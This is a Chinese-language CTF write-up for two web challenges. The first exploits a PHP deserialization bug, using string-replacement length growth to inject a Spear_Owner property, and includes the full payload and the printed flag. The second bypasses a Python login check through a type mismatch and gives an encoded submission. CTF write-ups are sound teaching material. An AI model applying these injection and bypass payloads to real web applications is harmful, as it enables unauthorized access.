# Web
### Author: 0xcafebabe


## CHALLENGE: 夺命十三枪
### 这道题对于我们根本没接触过web-php的小白来说是耳目一新，非常有趣，刷新了对php危险性的认知（
进去后直接给了我们php源码
```php
<?php
highlight_file(__FILE__);

require_once('Hanxin.exe.php');

$Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';

$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);

$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo 'Your Movements: ' . $after . '<br>';

try{
    echo unserialize($after);
}catch (Exception $e) {
    echo "Even Caused A Glitch...";
}
?>
```
初始输出：

```php
Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"Nobody";}
Far away from COOL...
```

观察Hanxin.exe.php

```php
<?php

if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    highlight_file(__FILE__);
}

class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        "di_yi_qiang" => "Lovesickness",
        "di_er_qiang" => "Heartbreak",
        "di_san_qiang" => "Blind_Dragon",
        "di_si_qiang" => "Romantic_charm",
        "di_wu_qiang" => "Peerless",
        "di_liu_qiang" => "White_Dragon",
        "di_qi_qiang" => "Penetrating_Gaze",
        "di_ba_qiang" => "Kunpeng",
        "di_jiu_qiang" => "Night_Parade_of_a_Hundred_Ghosts",
        "di_shi_qiang" => "Overlord",
        "di_shi_yi_qiang" => "Letting_Go",
        "di_shi_er_qiang" => "Decisive_Victory",
        "di_shi_san_qiang" => "Unrepentant_Lethality"
    );

    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}

class Omg_It_Is_So_Cool_Bring_Me_My_Flag{

    public $Chant = '';
    public $Spear_Owner = 'Nobody';

    function __construct($chant){
        $this->Chant = $chant;
        $this->Spear_Owner = 'Nobody';
    }

    function __toString(){
        if($this->Spear_Owner !== 'MaoLei'){
            return 'Far away from COOL...';
        }
        else{
            return "Omg You're So COOOOOL!!! " . getenv('FLAG');
        }
    }
}

?>
```

发现是一个超级危险的序列化函数，我们需要利用这个性质来修改Spear_Owner的值，让它输出FLAG

观察到，我们可以在字符串中掺入可以替换的文本，让php帮我们替换掉，这样没有更改s:xxxx的长度，但是却自己更改了文本内容。

观察到："di_yi_qiang" => "Lovesickness"，是一个可以把文本长度从11变12的payload，当然你可以使用其他的来实现，但是作为保守派，我才用一个一个一个一个..弄。

我们使用payload: chant=di_yi_qiang

```php
Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:11:"Lovesickness";s:11:"Spear_Owner";s:6:"Nobody";}
```

观察到s:11:"Lovesickness"，所以说重新序列化后它会认为最后一个s并不是Chant的里面的值，所以说字符串后面我们可以附加上我们想要是修改的Spear_Owner

也就是说我们需要在Chant里面就进行如下内容的修改：
";s:11:"Spear_Owner";s:6:"MaoLei";}

上述文本长度是35，所以
payload:
```php
chant=di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}
```

拿下！
```php
Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:420:"LovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesickness";s:11:"Spear_Owner";s:6:"MaoLei";}";s:11:"Spear_Owner";s:6:"Nobody";}
Omg You're So COOOOOL!!! moectf{C00L_b0Y!_AgRLCa33Xigs7VoTFcew67j7Fkc3cTl8}
```


## CHALLENGE: signin

```py
if params.get("username") == params.get("password"):
    self.send_response(403)
    self.end_headers()
    self.wfile.write(b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!")
    print("same")
    return
```

提交： {"username": "1", "password": 1}

即：VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVFVlZNV2h2VTIxR1dWcEhOVlJXZWxaRVdWVmtUbVZzVW5GVWJXeE9UVWhDZVZVeFpIZGtiRzkzVFZac1RsSkVRVGs9
即可过